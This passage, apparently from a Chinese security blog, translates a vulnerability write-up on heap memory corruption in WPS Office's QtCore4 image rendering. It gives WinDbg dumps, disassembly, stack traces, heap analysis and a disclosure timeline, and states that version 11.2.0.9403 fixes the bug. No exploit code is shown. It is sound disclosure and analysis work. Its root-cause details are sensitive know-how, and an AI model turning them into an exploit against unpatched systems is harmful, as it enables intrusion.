004f65a0 004f662c 00000000  .....eO.,fO.....</span><br><span class="line">004f1a6c  779eae8e 00000000 00000001 3f800000  ...w...........?</span><br><span class="line">004f1a7c  3f800000 3f31e4f8 3f800000 3f800000  ...?..1?...?...?</span><br><span class="line">004f1a8c  3f800000 3f31e4f8 3f800000 3de38800  ...?..1?...?...&#x3D;</span><br><span class="line">004f1a9c  3de38800 3d9e1c8a 3c834080 004f3c00  ...&#x3D;...&#x3D;.@.&lt;.&lt;O.</span><br><span class="line">004f1aac  4101c71c 6ba13315 3f800000 4081c71c  ...A.3.k...?...@</span><br></pre></td></tr></table></figure>

<p>从c45adfbc观察内存引用，发现另一个指针。第一个值ab69cf80始终表示为指向它所引用的任何地方的指针。指针ab69cf80基本上是我们指针的索引数组。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; dc c45adfbc</span><br><span class="line">c45adfbc  ab69cf80 d3544100 00000003 00000280  ..i..AT.........</span><br><span class="line">c45adfcc  0000055a 00000012 c0c0c0c0 1c3870e2  Z............p8.</span><br><span class="line">c45adfdc  40ad870e 1c3870e2 40ad870e 00000000  ...@.p8....@....</span><br><span class="line">c45adfec  00000000 c0c0c0c1 6c1d12c0 00000000  ...........l....</span><br><span class="line">c45adffc  c0c0c0c0 ???????? ???????? ????????  ....????????????</span><br><span class="line">c45ae00c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line">c45ae01c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line">c45ae02c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line"></span><br><span class="line">0:000&gt; dc ab69cf80</span><br><span class="line">ab69cf80  00000001 0000001c 00000010 00000001  ................ &#x2F;&#x2F; 0000001c is overwritten in the register EDX and EDI before we trigger crash</span><br><span class="line">ab69cf90  ff000000 ff800000 ff008000 ff808000  ................ </span><br><span class="line">ab69cfa0  ff000080 ff800080 ff008080 ff808080  ................</span><br><span class="line">ab69cfb0  ffc0c0c0 ffff0000 ff00ff00 ffffff00  ................ &#x2F;&#x2F; ffc0c0c0 where it will be stored in EAX after crash, at the moment it only takes 0xf value in EAX</span><br><span class="line">ab69cfc0  ff0000ff ffff00ff ff00ffff ffffffff  ................</span><br><span class="line">ab69cfd0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br><span class="line">ab69cfe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br><span class="line">ab69cff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br></pre></td></tr></table></figure>

<p>因为我们知道崩溃的路径，所以我们可以使用下面的命令简单地设置一个断点。该命令将获得指针值“ edx + eax * 4 + 10”，并检查其是否满足0xc0。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bp 6ba13321 &quot;.if (poi(edx+eax*4+10) &#x3D;&#x3D; 0xc0) &#123;&#125; .else &#123;gc&#125;&quot;</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br><span class="line">eax&#x3D;000000c0 ebx&#x3D;004f1b40 ecx&#x3D;c45adfbc edx&#x3D;ab69cf80 esi&#x3D;d1200e18 edi&#x3D;0000001c</span><br><span class="line">eip&#x3D;6ba13321 esp&#x3D;004f1a34 ebp&#x3D;004f1a34 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00200202</span><br><span class="line">QtCore4!QMatrix::dy+0x48a8:</span><br><span class="line">6ba13321 8b448210        mov     eax,dword ptr [edx+eax*4+10h] ds:002b:ab69d290&#x3D;????????</span><br></pre></td></tr></table></figure>

<p>如果观察堆栈，可以看到以下执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004f1a38 6ba3cb98 QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a74</span><br><span class="line">004f1a3c c45adfbc </span><br><span class="line">004f1a40 00000048 </span><br><span class="line">004f1a44 00000000 </span><br><span class="line">004f1a48 6f13830f verifier!DphCommitMemoryForPageHeap+0x16f</span><br><span class="line">004f1a4c 004f5cc8 </span><br><span class="line">004f1a50 00000000 </span><br><span class="line">004f1a54 00000000 </span><br><span class="line">004f1a58 00000000 </span><br><span class="line">004f1a5c 00000000 </span><br><span class="line">004f1a60 004f65a0 </span><br><span class="line">004f1a64 004f662c </span><br><span class="line">004f1a68 00000000 </span><br><span class="line">004f1a6c 779eae8e ntdll!RtlAllocateHeap+0x3e</span><br></pre></td></tr></table></figure>

<p>如果我们反汇编6ba3cb98，则可以看到以下反汇编代码。真正的根本原因在于此代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6ba3cb89 8b96b4000000    mov     edx,dword ptr [esi+0B4h]</span><br><span class="line">6ba3cb8f 8b4df4          mov     ecx,dword ptr [ebp-0Ch]</span><br><span class="line">6ba3cb92 52              push    edx</span><br><span class="line">6ba3cb93 8bd7            mov     edx,edi</span><br><span class="line">6ba3cb95 ff5580          call    dword ptr [ebp-80h]</span><br><span class="line">6ba3cb98 8b4e7c          mov     ecx,dword ptr [esi+7Ch]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C pseudo code</span><br><span class="line"></span><br><span class="line">grad &#x3D; *(&amp;ptr_grad);</span><br><span class="line">if ( grad &gt; 0.0099999998 )</span><br><span class="line">&#123;</span><br><span class="line">   input_value &#x3D; grad_size(check, size, input);</span><br><span class="line">   ptr_grad &#x3D; *(input);</span><br><span class="line">   ... cut here ...</span><br></pre></td></tr></table></figure>

<p>我们在6ba3cb89地址上设置断点，并观察ESI + 0xB4，我们可以看到一个指针指向另一个位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; r</span><br><span class="line">eax&#x3D;00000000 ebx&#x3D;00791878 ecx&#x3D;00000005 edx&#x3D;00793938 esi&#x3D;cb07de18 edi&#x3D;0000001c</span><br><span class="line">eip&#x3D;6ba3cb89 esp&#x3D;00791780 ebp&#x3D;00791870 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00200202</span><br><span class="line">QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a65:</span><br><span class="line">6ba3cb89 8b96b4000000    mov     edx,dword ptr [esi+0B4h] ds:002b:cb07decc&#x3D;cf69afbc</span><br><span class="line"></span><br><span class="line">0:000&gt; dc esi+0B4h</span><br><span class="line">cb07decc  cf69afbc c0c0c000 00000000 00000100  ..i.............</span><br><span class="line">cb07dedc  c0c0c0c0 00000000 00000000 00000000  ................</span><br><span class="line">cb07deec  00000000 00000000 00000000 00000000  ................</span><br><span class="line">cb07defc  00000000 cf030fd0 00000000 00000000  ................</span><br><span class="line">cb07df0c  00000000 00000000 00000000 00000000  ................</span><br><span class="line">cb07df1c  c0c0c0c0 00000000 3ff00000 00000000  ...........?....</span><br><span class="line">cb07df2c  00000000 00000000 00000000 00000000  ................</span><br><span class="line">cb07df3c  00000000 00000000 3ff00000 00000000  ...........?....</span><br><span class="line"></span><br><span class="line">0:000&gt; dc cf69afbc</span><br><span class="line">cf69afbc  c88baf80 d1326100 00000003 00000280  .....a2.........</span><br><span class="line">cf69afcc  0000055f 00000012 c0c0c0c0 1c3870e2  _............p8.</span><br><span class="line">cf69afdc  40ad870e 1c3870e2 40ad870e 00000000  ...@.p8....@....</span><br><span class="line">cf69afec  00000000 c0c0c0c1 6c1d12c0 00000000  ...........l....</span><br><span class="line">cf69affc  c0c0c0c0 ???????? ???????? ????????  ....????????????</span><br><span class="line">cf69b00c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line">cf69b01c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line">cf69b02c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line"></span><br><span class="line">0:000&gt; dc c88baf80</span><br><span class="line">c88baf80  00000001 0000001c 00000010 00000001  ................</span><br><span class="line">c88baf90  ff000000 ff800000 ff008000 ff808000  ................</span><br><span class="line">c88bafa0  ff000080 ff800080 ff008080 ff808080  ................</span><br><span class="line">c88bafb0  ffc0c0c0 ffff0000 ff00ff00 ffffff00  ................</span><br><span class="line">c88bafc0  ff0000ff ffff00ff ff00ffff ffffffff  ................</span><br><span class="line">c88bafd0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br><span class="line">c88bafe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br><span class="line">c88baff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br></pre></td></tr></table></figure>

<p>从这里我们可以知道代码实际上没有从指针释放任何东西。一旦移至EDX，EDX将保留指向索引数组的指针：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eax&#x3D;00000000 ebx&#x3D;00791878 ecx&#x3D;00000005 edx&#x3D;cf69afbc esi&#x3D;cb07de18 edi&#x3D;0000001c</span><br><span class="line">eip&#x3D;6ba3cb8f esp&#x3D;00791780 ebp&#x3D;00791870 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00200202</span><br><span class="line">QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a6b:</span><br><span class="line">6ba3cb8f 8b4df4          mov     ecx,dword ptr [ebp-0Ch] ss:002b:00791864&#x3D;d1326100</span><br><span class="line"></span><br><span class="line">0:000&gt; dc cf69afbc</span><br><span class="line">cf69afbc  c88baf80 d1326100 00000003 00000280  .....a2.........</span><br><span class="line">cf69afcc  0000055f 00000012 c0c0c0c0 1c3870e2  _............p8.</span><br><span class="line">cf69afdc  40ad870e 1c3870e2 40ad870e 00000000  ...@.p8....@....</span><br><span class="line">cf69afec  00000000 c0c0c0c1 6c1d12c0 00000000  ...........l....</span><br><span class="line">cf69affc  c0c0c0c0 ???????? ???????? ????????  ....????????????</span><br><span class="line">cf69b00c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line">cf69b01c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line">cf69b02c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line"></span><br><span class="line">0:000&gt; dc c88baf80</span><br><span class="line">c88baf80  00000001 0000001c 00000010 00000001  ................</span><br><span class="line">c88baf90  ff000000 ff800000 ff008000 ff808000  ................</span><br><span class="line">c88bafa0  ff000080 ff800080 ff008080 ff808080  ................</span><br><span class="line">c88bafb0  ffc0c0c0 ffff0000 ff00ff00 ffffff00  ................</span><br><span class="line">c88bafc0  ff0000ff ffff00ff ff00ffff ffffffff  ................</span><br><span class="line">c88bafd0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br><span class="line">c88bafe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br><span class="line">c88baff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br></pre></td></tr></table></figure>

<p>崩溃后的堆栈跟踪：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; kvL</span><br><span class="line"> # ChildEBP RetAddr  Args to Child              </span><br><span class="line">00 012f18d4 6ba3cb98 cc53afbc 00000048 00000000 QtCore4!QMatrix::dy+0x48a8</span><br><span class="line">01 012f19d0 6b8143ef 00000000 012f1b78 012f1a5c QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a74</span><br><span class="line">02 012f1a30 6b814259 0000002e 012f5bd0 00000000 QtCore4!QBrush::setMatrix+0x234</span><br><span class="line">03 012f5b14 6b8249a4 0000003b 012f5b68 cc780e18 QtCore4!QBrush::setMatrix+0x9e</span><br><span class="line">04 012f5b2c 6b80cc84 0000003b 012f5b68 cc780e18 QtCore4!QImage::rect+0x22b</span><br><span class="line">05 012f5b48 6b857ccc 0000003b 012f5b68 cc780e18 QtCore4!QTransform::inverted+0xec8</span><br><span class="line">06 012f64dc 6b81c55b 00000000 003c0000 00000000 QtCore4!QSvgFillStyle::setFillOpacity+0x1b59</span><br><span class="line">07 012f66c0 6b896844 012f6724 cc818ff0 0000001c QtCore4!QPainter::drawPixmap+0x1c98</span><br><span class="line">08 012f67b4 6d1e0fbd 012f69ec 012f66d4 012f6864 QtCore4!QPainter::drawImage+0x325</span><br><span class="line">09 012f67d4 6d0dd155 012f6a54 012f69ec 012f6864 kso!GdiDrawHoriLineIAlt+0x11a1a</span><br><span class="line">0a 012f67ec 6d0c8d88 012f69ec 012f68e0 012f6864 kso!kpt::PainterExt::drawBitmap+0x23</span><br></pre></td></tr></table></figure>

<p>堆分析：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; !heap -p -a cc53afbc</span><br><span class="line">    address cc53afbc found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 6731000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                cc36323c:         cc53afa8               58 -         cc53a000             2000</span><br><span class="line">    6f13ab70 verifier!AVrfDebugPageHeapAllocate+0x00000240</span><br><span class="line">    77a9909b ntdll!RtlDebugAllocateHeap+0x00000039</span><br><span class="line">    779ebbad ntdll!RtlpAllocateHeap+0x000000ed</span><br><span class="line">    779eb0cf ntdll!RtlpAllocateHeapInternal+0x0000022f</span><br><span class="line">    779eae8e ntdll!RtlAllocateHeap+0x0000003e</span><br><span class="line">    6f080269 MSVCR100!malloc+0x0000004b</span><br><span class="line">    6f08233b MSVCR100!operator new+0x0000001f</span><br><span class="line">    6b726c67 QtCore4!QImageData::create+0x000000fa</span><br><span class="line">    6b726b54 QtCore4!QImage::QImage+0x0000004e</span><br><span class="line">    6b7a0e21 QtCore4!png_get_text+0x00000436</span><br><span class="line">    6b79d7a8 QtCore4!QImageIOHandler::setFormat+0x000000de</span><br><span class="line">    6b79d457 QtCore4!QPixmapData::fromFile+0x000002bf</span><br><span class="line">    6b725eb4 QtCore4!QImageReader::read+0x000001e2</span><br><span class="line">    6d0ca585 kso!kpt::VariantImage::forceUpdateCacheImage+0x0000254e</span><br><span class="line">    6d0c5964 kso!kpt::Direct2DPaintEngineHelper::operator&#x3D;+0x00000693</span><br><span class="line">    6d0c70d0 kso!kpt::RelativeRect::unclipped+0x00001146</span><br><span class="line">    6d0c8d0c kso!kpt::VariantImage::forceUpdateCacheImage+0x00000cd5</span><br><span class="line">    6d451d5c kso!BlipCacheMgr::BrushCache+0x0000049a</span><br><span class="line">    6d451e85 kso!BlipCacheMgr::GenerateBitmap+0x0000001d</span><br><span class="line">    6d453227 kso!BlipCacheMgr::GenCachedBitmap+0x00000083</span><br><span class="line">    6d29bb92 kso!drawing::PictureRenderLayer::render+0x000009b6</span><br><span class="line">    6d450fb1 kso!drawing::RenderTargetImpl::paint+0x00000090</span><br><span class="line">    6d29b528 kso!drawing::PictureRenderLayer::render+0x0000034c</span><br><span class="line">    6d2a2d83 kso!drawing::VisualRenderer::render+0x00000060</span><br><span class="line">    6d2b8970 kso!drawing::SingleVisualRenderer::drawNormal+0x000002b5</span><br><span class="line">    6d2b86a7 kso!drawing::SingleVisualRenderer::draw+0x000001e1</span><br><span class="line">    6d2b945e kso!drawing::SingleVisualRenderer::draw+0x00000046</span><br><span class="line">    6d3d0142 kso!drawing::ShapeVisual::paintEvent+0x0000044a</span><br><span class="line">    680a2b5c wpsmain!WpsShapeTreeVisual::getHittestSubVisuals+0x000068f1</span><br><span class="line">    6d0e36df kso!AbstractVisual::visualEvent+0x00000051</span><br><span class="line">    6d3cbe97 kso!drawing::ShapeVisual::visualEvent+0x0000018f</span><br><span class="line">    6d0eba90 kso!VisualPaintEvent::arriveVisual+0x0000004e</span><br><span class="line"></span><br><span class="line">0:000&gt; dt _DPH_BLOCK_INFORMATION cc780e18-0x20</span><br><span class="line">verifier!_DPH_BLOCK_INFORMATION</span><br><span class="line">   +0x000 StartStamp       : 0xc0c0c0c0</span><br><span class="line">   +0x004 Heap             : 0xc0c0c0c0 Void</span><br><span class="line">   +0x008 RequestedSize    : 0xc0c0c0c0</span><br><span class="line">   +0x00c ActualSize       : 0xc0c0c0c0</span><br><span class="line">   +0x010 Internal         : _DPH_BLOCK_INTERNAL_INFORMATION</span><br><span class="line">   +0x018 StackTrace       : 0xc0c0c0c0 Void</span><br><span class="line">   +0x01c EndStamp         : 0xc0c0c0c0</span><br></pre></td></tr></table></figure>

<p>段中的最后一个堆条目通常是一个空闲块。堆块的状态指示为空闲块。堆块声明前一个块的大小为00108，而当前块的大小为00a30。前一块报告其自身大小为0x20字节，不匹配。位置为05f61000的堆块的使用似乎是该堆块的使用导致以下块的元数据损坏的可能性。堆块：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; !heap -a 05f60000 </span><br><span class="line">Index   Address  Name      Debugging options enabled</span><br><span class="line">  1:   05f60000 </span><br><span class="line">    Segment at 05f60000 to 0605f000 (00001000 bytes committed)</span><br><span class="line">    Flags:                00000002</span><br><span class="line">    ForceFlags:           00000000</span><br><span class="line">    Granularity:          8 bytes</span><br><span class="line">    Segment Reserve:      00100000</span><br><span class="line">    Segment Commit:       00002000</span><br><span class="line">    DeCommit Block Thres: 00000200</span><br><span class="line">    DeCommit Total Thres: 00002000</span><br><span class="line">    Total Free Size:      00000146</span><br><span class="line">    Max. Allocation Size: fffdefff</span><br><span class="line">    Lock Variable at:     05f60258</span><br><span class="line">    Next TagIndex:        0000</span><br><span class="line">    Maximum TagIndex:     0000</span><br><span class="line">    Tag Entries:          00000000</span><br><span class="line">    PsuedoTag Entries:    00000000</span><br><span class="line">    Virtual Alloc List:   05f6009c</span><br><span class="line">    Uncommitted ranges:   05f6008c</span><br><span class="line">            05f61000: 000fe000  (1040384 bytes)</span><br><span class="line">    FreeList[ 00 ] at 05f600c0: 05f605b8 . 05f605b8  </span><br><span class="line">        05f605b0: 00108 . 00a30 [100] - free</span><br><span class="line"></span><br><span class="line">    Segment00 at 05f60000:</span><br><span class="line">        Flags:           00000000</span><br><span class="line">        Base:            05f60000</span><br><span class="line">        First Entry:     05f604a8</span><br><span class="line">        Last Entry:      0605f000</span><br><span class="line">        Total Pages:     000000ff</span><br><span class="line">        Total UnCommit:  000000fe</span><br><span class="line">        Largest UnCommit:00000000</span><br><span class="line">        UnCommitted Ranges: (1)</span><br><span class="line"></span><br><span class="line">    Heap entries for Segment00 in Heap 05f60000</span><br><span class="line">         address: psize . size  flags   state (requested size)</span><br><span class="line">        05f60000: 00000 . 004a8 [101] - busy (4a7)</span><br><span class="line">        05f604a8: 004a8 . 00108 [101] - busy (107) Internal </span><br><span class="line">        05f605b0: 00108 . 00a30 [100]</span><br><span class="line">        05f60fe0: 00a30 . 00020 [111] - busy (1d)</span><br><span class="line">        05f61000:      000fe000      - uncommitted bytes.</span><br><span class="line"></span><br><span class="line">0:000&gt; dd 05f60fe0</span><br><span class="line">05f60fe0  a9b3c836 03007087 05f6008c 05f6008c</span><br><span class="line">05f60ff0  05f60038 05f60038 05f61000 000fe000</span><br><span class="line">05f61000  ???????? ???????? ???????? ????????</span><br><span class="line">05f61010  ???????? ???????? ???????? ????????</span><br><span class="line">05f61020  ???????? ???????? ???????? ????????</span><br><span class="line">05f61030  ???????? ???????? ???????? ????????</span><br><span class="line">05f61040  ???????? ???????? ???????? ????????</span><br><span class="line">05f61050  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure>

<h2 id="披露时间表"><a href="#披露时间表" class="headerlink" title="披露时间表"></a>披露时间表</h2><p>该漏洞于2020年8月报告。披露时间表：</p>
<ul>
<li>2020-08-04-将电子邮件发送到公开提供的WPS的各种邮件列表（销售和支持）。</li>
<li>2020-08-10-WPS团队回应该报告可以转发给他们。</li>
<li>2020-08-11-要求进一步的信息，例如咨询和向适当的渠道披露等。</li>
<li>2020-08-17-根据先前的要求与WPS团队进行跟进。</li>
<li>2020-08-18-WPS团队做出回应，他们会照顾好它，并转交给开发团队。</li>
<li>2020-08-18-通过电子邮件提供技术报告和概念验证（未加密）。</li>
<li>2020-08-25-WPS跟进报告进度。</li>
<li>2020-08-26-WPS更新说此问题已转发给开发团队。</li>
<li>2020-08-28-WPS发送了一封电子邮件，指出该问题已在最新的下载版本11.2.0.9403中得到解决。</li>
<li>2020-08-28-针对提供的PoC测试了新版本，并确认问题已解决。</li>
<li>2020-08-28-向WPS团队寻求咨询或更改日志更新。</li>
<li>2020-08-31-WPS团队通知他们不再更新或维护任何安全公告。</li>
<li>2020-09-03-漏洞写信 要求CVE。</li>
</ul>
<p>参考链接：<a href="http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html">http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html</a></p>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>堆</tag>
      </tags>
  </entry>
</search>
